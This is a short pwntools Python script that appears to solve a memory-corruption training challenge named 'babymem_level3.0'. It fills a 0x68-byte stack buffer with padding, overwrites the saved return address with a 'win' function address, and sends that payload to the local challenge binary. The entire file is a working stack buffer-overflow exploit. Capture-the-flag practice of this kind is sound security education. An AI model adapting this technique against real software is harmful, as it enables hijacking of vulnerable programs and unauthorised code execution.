from pwn import *

# Init 
elf = ELF("/challenge/babymem_level3.0")
buffer_length = int("68", 16) #local_68

address_win_function = p64(0x401cf9)

io = elf.process()

# Payload
payload = b"A"*buffer_length + address_win_function

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length + 8))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()